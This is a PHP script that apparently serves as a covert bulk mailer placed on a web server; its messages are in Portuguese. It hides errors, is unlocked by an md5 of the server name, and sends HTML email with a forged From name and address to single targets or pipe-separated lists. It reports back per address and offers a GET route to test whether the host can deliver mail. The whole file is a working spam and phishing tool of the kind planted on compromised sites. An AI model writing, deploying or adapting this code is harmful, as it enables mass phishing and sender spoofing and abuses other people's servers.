<?php
@set_time_limit(false);
@ini_set("display_errors", false);
$server = $_SERVER["SERVER_NAME"];
if (@isset($_POST["hash"])) {
    if (md5($server) != $_POST["hash"]) {
        header('Content-type: application/json');
        $data = ['enviado' => 'false', 'Error' => 'Hash Inválido'];
        echo json_encode($data);
    } else if (@isset($_POST["to"])) {
        header('Content-type: application/json');
        $to = $_POST["to"];
        $from = $_POST["from"];
        $fromnome = $_POST["name"];
        $subject = $_POST["subject"];
        $html = $_POST["sourcehtml"];
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-Type: text/html" . "\r\n";
        $headers .= "Content-Transfer-Encoding: base64" . "\r\n";
        $headers .= "From: " . $fromnome . " <" . $from . ">" . "\r\n";
        if (mail($to, $subject, rtrim(chunk_split(base64_encode($html))), $headers)) {
            $data = ['enviado' => 'true', 'url' => $server];
            echo json_encode($data);
        } else {
            $data = ['enviado' => 'false', 'url' => $server];
            echo json_encode($data);
        }
    } else if (@isset($_POST["listmail"])) {
        $listmail = $_POST["listmail"];
        $mail = explode("|", $listmail);
        $i = 0;
        $notsend = 0;
        $from = $_POST["from"];
        $fromnome = $_POST["name"];
        $subject = $_POST["subject"];
        $html = $_POST["sourcehtml"];
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-Type: text/html" . "\r\n";
        $headers .= "Content-Transfer-Encoding: base64" . "\r\n";
        $headers .= "From: " . $fromnome . " <" . $from . ">" . "\r\n";
        $log = array();
        while ($mail[$i]) {
            if ($notsend < 5) {
                if (mail($mail[$i], $subject, rtrim(chunk_split(base64_encode($html))), $headers)) {
                    $log += [$mail[$i] => true];
                    $notsend = 0;
                } else {
                    $log += [$mail[$i] => false];
                    $notsend++;
                }
                $i++;
                $count++;
            } else {
                $log += ['Error' => "SENDMAIL OFFLINE"];
                break;
            }
        }
        header('Content-type: application/json');
        echo json_encode($log);
    } else {
        header('Content-type: application/json');
        $data = ['enviado' => 'false', 'Error' => 'Sem parametro [to] ou [Listmail]'];
        echo json_encode($data);
    }
} else if (@isset($_GET["to"])) {
    header('Content-type: application/json');
    $to = $_GET["to"];
    $from = 'saw@saw.com.br';
    $fromnome = 'Saw';
    $subject = 'Teste de envio de e-mail from ' . $server;
    $html = '<h1>Olá, ' . $to . '</h1></br>Teste de envio de e-mail com sucesso!</br>';
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-Type: text/html" . "\r\n";
    $headers .= "Content-Transfer-Encoding: base64" . "\r\n";
    $headers .= "From: " . $fromnome . " <" . $from . ">" . "\r\n";
    if (mail($to, $subject, rtrim(chunk_split(base64_encode($html))), $headers)) {
        $data = ['enviado' => 'true', 'url' => $server];
        echo json_encode($data);
    } else {
        $data = ['Error' => "SENDMAIL OFFLINE", 'url' => $server];
        echo json_encode($data);
    }
} else {
    header('Content-type: application/json');
    $data = ['enviado' => 'false', 'Error' => 'Erro hash autenticator'];
    echo json_encode($data);
}
